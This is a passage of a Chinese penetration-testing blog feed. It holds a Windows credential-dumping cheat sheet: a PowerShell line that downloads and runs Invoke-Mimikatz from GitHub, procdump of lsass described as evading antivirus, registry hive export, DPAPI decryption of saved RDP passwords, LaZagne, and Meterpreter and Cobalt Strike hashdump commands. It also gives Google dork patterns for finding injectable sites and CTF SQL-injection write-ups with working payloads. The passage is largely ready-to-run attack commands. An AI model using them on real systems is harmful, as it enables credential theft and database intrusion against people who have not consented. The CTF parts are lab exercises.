class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">mattifestation</span><span class="hljs-operator">/</span>PowerSploit<span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span>Exfiltration<span class="hljs-operator">/</span>Invoke-Mimikatz.<span class="hljs-params">ps1</span>&#x27;)</span>;Invoke-Mimikatz-DumpCreds<br>   <br></code></pre></td></tr></table></figure></li></ol><h3 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h3><blockquote><p>  ProcDump是一个命令行程序，可以很方便地将系统正在运行的进程转存储生成为dump文件，又因为  是微软自家出品，所以可以过很多杀软。  </p></blockquote><p>  Procdump导出lsass 进程  </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"># For <span class="hljs-number">32</span>bits：<br>procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br># For <span class="hljs-number">64</span>bits：<br>procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-number">64</span> -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br><br></code></pre></td></tr></table></figure><p>使用 mimikatz 还原密码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><h3 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h3><blockquote><p><strong>reg save</strong> HKLM\SYSTEM system.hiv  </p><p> <strong>reg save</strong> HKLM\SAM sam.hiv  </p><p> <strong>reg save</strong> HKLM\SECURITY security.hiv  </p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;lsadump::sam  /system:system.hiv /sam:sam.hiv&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>  <br></code></pre></td></tr></table></figure><h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><blockquote><p>  <a href="https://github.com/SecureAuthCorp/impacket/tree/master/examples">https://github.com/SecureAuthCorp/impacket/tree/master/examples</a>  </p></blockquote><h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><blockquote><p>  <a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a>  </p></blockquote><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone https://github.<span class="hljs-keyword">com</span>/AlessandroZ/LaZagne.git<br><span class="hljs-keyword">cd</span> LaZagne/<br><span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> pip install -r requirements.txt<br><span class="hljs-keyword">cd</span> Windows/<br><span class="hljs-keyword">python3</span> laZagne.<span class="hljs-keyword">py</span> -h<br><span class="hljs-keyword">python3</span> laZagne.<span class="hljs-keyword">py</span> <span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><h3 id="Meterpreter获取Hash"><a href="#Meterpreter获取Hash" class="headerlink" title="Meterpreter获取Hash"></a>Meterpreter获取Hash</h3><ol><li><p>查询是什么身份</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">getuid</span><br></code></pre></td></tr></table></figure></li><li><p>获取hash值</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112135357843.png" alt="image-20240112135357843"></p><p>可以反映出相关的hash</p></li><li><p>提权到system</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">getsystem</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112135605815.png" alt="image-20240112135605815"></p></li><li><p>加载猕猴桃模块</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112135914371.png" alt="image-20240112135914371"></p></li><li><p>获取明文密码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">creds_all<br>kiwi_cmd sekurlsa::logonpasswords <br></code></pre></td></tr></table></figure></li><li><p>返回之前的权限</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">rev2self<br></code></pre></td></tr></table></figure></li><li><p>获取sam数据库</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112140327159.png" alt="image-20240112140327159"></p></li></ol><h3 id="CS-获取hash"><a href="#CS-获取hash" class="headerlink" title="CS 获取hash"></a>CS 获取hash</h3><p>主要还是使用   Mimikatz  </p><ol><li><p>获取hash</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115162931213.png" alt="image-20240115162931213"></p></li><li><p>获取密码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">logonpasswords<br>mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115163016831.png" alt="image-20240115163016831"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115163108233.png" alt="image-20240115163108233"></p></li><li><p>获取sam</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz lsadump::sam<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115163155828.png" alt="image-20240115163155828"></p></li><li><p>cs会自动收录密码凭证</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115163317507.png" alt="image-20240115163317507"></p></li></ol><h3 id="hash解密"><a href="#hash解密" class="headerlink" title="hash解密"></a>hash解密</h3><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><h1 id="其他密码凭证获取"><a href="#其他密码凭证获取" class="headerlink" title="其他密码凭证获取"></a>其他密码凭证获取</h1><h2 id="RDP连接密码解密"><a href="#RDP连接密码解密" class="headerlink" title="RDP连接密码解密"></a>RDP连接密码解密</h2><ol><li><p>查看本地机器本地连接过的目标主机</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;</span> /s<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115154822166.png" alt="image-20240115154822166"></p></li><li><p>查看本地用用户此目录下是否存在RDP密码文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> /a %userprofile%\AppData\Local\Microsoft\Credentials\*<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115155014440.png" alt="image-20240115155014440"></p></li><li><p>查看保存在本地的远程主机信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmdkey /list<br></code></pre></td></tr></table></figure></li><li><p>选择一个密码文件对其进行解密</p><p>在此之前我们必须得先记录一个guidMasterKey 的值，然后要通过guidMasterKey 找对应的 Masterkey</p><p>现在使用使用cs中的mimikatz 进行复现，在cs中使用mimikatz 就直接在前面添加mimikatz 就可以了</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">privilege</span>::<span class="hljs-built_in">debug</span>  <br><br><span class="hljs-name">dpapi</span>::cred  /<span class="hljs-name">in</span>:<span class="hljs-name">C</span>:\Users\mingy\AppData\Local\Microsoft\Credentials\<span class="hljs-number">1E85</span>A94EE31F584E484B8120E3ADA266<br></code></pre></td></tr></table></figure><p>记录guidMasterKey </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sekurlsa::dpapi<br></code></pre></td></tr></table></figure><p>根据 guidMasterKey 找到对应的 Masterkey</p><p>通过Masterkey解密pbData数据，拿到明文RDP连接密码  </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">dpapi:</span>:cred /in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\<span class="hljs-number">1E85</span>A<span class="hljs-number">94</span>EE<span class="hljs-number">31</span>F<span class="hljs-number">584E484</span>B<span class="hljs-number">8120E3</span>ADA<span class="hljs-number">266</span>/masterkey:f<span class="hljs-number">391</span>aa<span class="hljs-number">638</span>da<span class="hljs-number">6</span>b<span class="hljs-number">6</span>d<span class="hljs-number">846685</span>f<span class="hljs-number">84660</span>ee<span class="hljs-number">638</span>bd<span class="hljs-number">6</span>d<span class="hljs-number">3122214</span>de<span class="hljs-number">34285</span>b<span class="hljs-number">4</span>dd<span class="hljs-number">3</span>bd<span class="hljs-number">827</span>a<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">3925</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span>bd<span class="hljs-number">7</span>a<span class="hljs-number">448</span><span class="hljs-keyword">c</span><span class="hljs-number">175457</span><span class="hljs-keyword">c</span><span class="hljs-number">19</span>b<span class="hljs-number">2556</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>f<span class="hljs-number">6</span>f<span class="hljs-number">5248</span>ef<span class="hljs-number">9256060</span>a<span class="hljs-number">5</span>b<span class="hljs-number">74</span><span class="hljs-keyword">c</span><span class="hljs-number">1264</span>d<span class="hljs-number">3</span>a<span class="hljs-number">5</span>a<span class="hljs-number">99</span>f<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="MySQL数据库密码破解"><a href="#MySQL数据库密码破解" class="headerlink" title="MySQL数据库密码破解"></a>MySQL数据库密码破解</h2><p>  一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途  径来访问数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。  MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文  件读取权限后即可直接从数据库连接文件中读取。一般都包含有数据库类型，物理位置，用户名和密码等信息</p><h3 id="MySQL数据库文件类型"><a href="#MySQL数据库文件类型" class="headerlink" title="MySQL数据库文件类型"></a>MySQL数据库文件类型</h3><blockquote><p>  “.frm” 是描述表结构的文件  “.MYD” 是表的数据文件  “.MYI” 是表数据文件中任何索引的数据树  </p></blockquote><p>一般是单独存在一个文件夹中与用户有关的一共有三个文件即user.frm、user.MYD和user.MYI，MySQL数据库用户密码都保存  在user.MYD文件中，包括root用户和其他用户的密码。  </p><h3 id="MySQL加密方式"><a href="#MySQL加密方式" class="headerlink" title="MySQL加密方式"></a>MySQL加密方式</h3><p>MYSQL数据库的认证密码有两种方式MYSQL 4.1版本之前是MYSQL323加密，MYSQL 4.1和之后的版本都是MYSQLSHA1加密MYSQL数据库中自带 Old_Password(str) 和 Password(str)函数,它们均可以在MYSQL数据库里  进行查询，前者是MYSQL323加密，后者是MYSQLSHA1方式加密。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115172020746.png" alt="image-20240115172020746"></p><p>MYSQL323加密中生成的是16位字符串，而在MYSQLSHA1中生成的是41位字符串，其中*是不加入实  际的密码运算中，MYSQLSHA1加密的密码的实际位数是40位  </p><h3 id="获取mysql数据库的hash值"><a href="#获取mysql数据库的hash值" class="headerlink" title="获取mysql数据库的hash值"></a>获取mysql数据库的hash值</h3><p>只需要将user.MYD文件放进二进制编辑器就可以</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115172204334.png" alt="image-20240115172204334"></p><p>然后可以尝试对其解密</p><h3 id="hash解密-1"><a href="#hash解密-1" class="headerlink" title="hash解密"></a>hash解密</h3><ol><li><p>hash网站</p><blockquote><p>  <a href="http://www.cmd5.com/">www.cmd5.com</a>  </p><p> <a href="http://www.somd5.com/">www.somd5.com</a>  </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115172347238.png" alt="image-20240115172347238"></p></li><li><p>hashcat</p></li><li><p>john the ripper 破解</p></li></ol><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115172859541.png" alt="image-20240115172859541"></p><p>   感觉这个会快很多</p><h3 id="应用程序密码解密"><a href="#应用程序密码解密" class="headerlink" title="应用程序密码解密"></a>应用程序密码解密</h3><p>  对密码已保存在 Windwos 系统上的部分程序进行解析，包括：  Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。  </p><p>  ackBrowserData 是一个浏览器数据（密码|历史记录|Cookie|书签|信用卡|下载记录|localStorage|浏览器插件）的导出工具，支持全平台主流浏览器。  </p><p><a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql挖掘技巧</title>
    <link href="/2024/01/09/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/sql%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/"/>
    <url>/2024/01/09/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/sql%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>漏洞挖掘不像是渗透，挖掘不需要打穿，点到为止就可以了，写这个的原因是，学习怎么挖掘sql漏洞</p><p>但是挖掘漏洞之前都必须要实现一下 网站的正常功能</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>不管是漏洞挖掘还是渗透测试，最重要的都是信息收集</p><p>主要的方法就是</p><ol><li><p>网络空间搜索引擎（对edu有奇效）</p></li><li><p>谷歌搜索语法</p><blockquote><p>about.php?cartID&#x3D;<br>accinfo.php?cartld&#x3D;<br>acclogin.php?cartID&#x3D;<br>add.php?bookid&#x3D;<br>add_cart.php?num&#x3D;<br>addcart.php?addltem.php add-to-cart.php?ID&#x3D;<br>addToCart.php?idProduct&#x3D;<br>addtomylist.php?Prodld&#x3D;<br>adminEditProductFields.php?intProdID&#x3D;<br>advSearch_h.php?idCategory&#x3D;<br>affiliate.php?ID&#x3D;<br>affiliate-agreement.cfm?storeid&#x3D;<br>affiliates.php?id&#x3D;<br>ancillary.php?ID&#x3D;<br>archive.php?id&#x3D;<br>article.php?id&#x3D;<br>phpx?PagelD basket.php?id&#x3D;<br>Book.php?bookID&#x3D;<br>book_list.php?bookid&#x3D;<br>book_view.php?bookid&#x3D;<br>BookDetails.php?ID&#x3D;<br>browse.php?catid&#x3D;</p></blockquote></li><li><p>添加单引号。确认是否存在SQL注入漏洞</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql</title>
    <link href="/2024/01/07/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/sql/"/>
    <url>/2024/01/07/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/sql/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPUCTF-2021-新生赛-error"><a href="#SWPUCTF-2021-新生赛-error" class="headerlink" title="[SWPUCTF 2021 新生赛]error"></a>[SWPUCTF 2021 新生赛]error</h1><p><strong>0x00</strong></p><p>看提示感觉像是一个sql注入</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107224511477.png" alt="image-20240107224511477"></p><p><strong>0x01</strong></p><p>先输入一个1，看看是post 还是get</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107224549868.png" alt="image-20240107224549868"></p><p>是get，那我们就使用hackbar</p><p><strong>0x02</strong></p><p>判断字符型还是数字型</p><p>输入1 不报错</p><p>输入1&#96; 报错</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107224748676.png" alt="image-20240107224748676"></p><p>所以是字符型</p><p><strong>0x03</strong></p><p>根据提示，这个是报错注入，使用updatexml()函数</p><p>然后就是联合注入的一部分</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107225111406.png" alt="image-20240107225111406"></p><p><strong>0x04</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27; union select updatexml(0x7e,concat(&#x27;~&#x27;,(select database())),0x7e) --+ <br>1&#x27; union select updatexml(0x7e,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27; )),0x7e) --+ <br>1&#x27; union select updatexml(0x7e,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;test_tb&#x27; )),0x7e) --+ <br></code></pre></td></tr></table></figure><p>最后确定是test_db.test_tb的flag列</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107225459059.png" alt="image-20240107225459059"></p><p>发现不能显示完，我们使用substr()控制一下</p><blockquote><p><a href="http://node4.anna.nssctf.cn:28736/index.php?id=1">http://node4.anna.nssctf.cn:28736/index.php?id=1</a>‘ union select updatexml(0x7e,concat(‘~’,substr((select flag from test_db.test_tb ),30,40)),0x7e) –+ </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107230238888.png" alt="image-20240107230238888"></p><h1 id="SWPUCTF-2021-新生赛-sql"><a href="#SWPUCTF-2021-新生赛-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]sql"></a>[SWPUCTF 2021 新生赛]sql</h1><p><strong>0x00</strong> </p><p>这个的重点是空格绕过，也就是想办法绕过空格</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109131147652.png" alt="image-20240109131147652"></p><p>注意参数，然后开始尝试，发现1是可以执行的</p><p><strong>0x01</strong></p><p>然后我尝试判断是什么类型</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109131500740.png" alt="image-20240109131500740"></p><p>一个引号出现了 问题，但是两个没有问题，所以判断是字符型，然后尝试获取显示位</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109131609419.png" alt="image-20240109131609419"></p><p>非法操作，在这个地方出现错误，我先想到有两种</p><blockquote><ol><li>空格绕过</li><li>注释</li></ol></blockquote><p>为了方便，我一下用了两种</p><blockquote><p>?wllm&#x3D;1’&#x2F;<strong>&#x2F;order&#x2F;</strong>&#x2F;by&#x2F;**&#x2F;4%23</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109131831661.png" alt="image-20240109131831661"></p><p><img src="D:\hexo\source_posts\CTF刷题记录\WEB\sql.assets\image-20240109132010921.png" alt="image-20240109132010921"><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109132011437.png" alt="image-20240109132011437"></p><p><strong>0x02</strong></p><p>然后就是联合查询那些，一直到获取列的元素</p><blockquote><p>-1’union&#x2F;<strong>&#x2F;1,<a href="https://so.csdn.net/so/search?q=group_concat&spm=1001.2101.3001.7020">group_concat</a>(table_name),3&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;information_schema.tables&#x2F;</strong>&#x2F;where&#x2F;<strong>&#x2F;table_schema&#x2F;</strong>&#x2F;like(database())%23</p><p>-1’union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,group_concat(column_name),3&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;information_schema.columns&#x2F;<strong>&#x2F;where&#x2F;</strong>&#x2F;table_name&#x2F;**&#x2F;like(“LTLT_flag”)%23</p><p>-1’union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,database(),flag&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;LTLT_flag%23</p></blockquote><p>发现出现了问题<img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109132231829.png" alt="image-20240109132231829"></p><p>遇到这个问题，我首先想到的是，使用<code>substr</code></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109132346261.png" alt="image-20240109132346261"></p><p>猜测可能把substr禁止了，所以尝试使用其他的方法</p><blockquote><p>letf()</p><p>right()</p><p>mid()</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109133120413.png" alt="image-20240109133120413"></p><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p><strong>0x00</strong></p><p>这个主要是使用堆叠注入</p><p><strong>0x01</strong></p><p>先实现网站的正常功能</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121152846103.png" alt="image-20240121152846103"></p><p>先判断闭合</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121153005383.png" alt="image-20240121153005383"><br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121153017298.png" alt="image-20240121153017298"></p><p>通过这个发现应该是单引号闭合</p><p><strong>0x02</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121153124797.png" alt="image-20240121153124797"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121153135602.png" alt="image-20240121153135602"></p><p><strong>0x03</strong></p><p>尝试使用select 判断一下显示位</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121153246174.png" alt="image-20240121153246174"></p><p>发现被禁用了 </p><p>select 被禁用的话，那么联合注入，报错注入，盲注等，都不行了</p><p>尝试堆叠注入</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121153537212.png" alt="image-20240121153537212"></p><p>发现可以使用堆叠注入</p><p><strong>0x04</strong></p><p>先看看有哪些表</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121153837239.png" alt="image-20240121153837239"></p><p>一个一个查</p><p><strong>0x05</strong> 爆破字段</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121153945954.png" alt="image-20240121153945954"></p><p><strong>0x06</strong></p><p>发现了flag，但是想要获取字段的话，就必须使用select，就很难办</p><p>但是我们可以使用网页后端自带的select 也就是说，我们可以将原来的word -&gt; word1 192这个表变成words</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121155702752.png" alt="image-20240121155702752"></p><p>同时还得将这个修改了，我们可以添加一个ip列，然后将flag这一列变成data</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT &#x27;</span><span class="hljs-number">12</span><span class="hljs-string">&#x27;;ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q</span><br></code></pre></td></tr></table></figure><p>然后使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 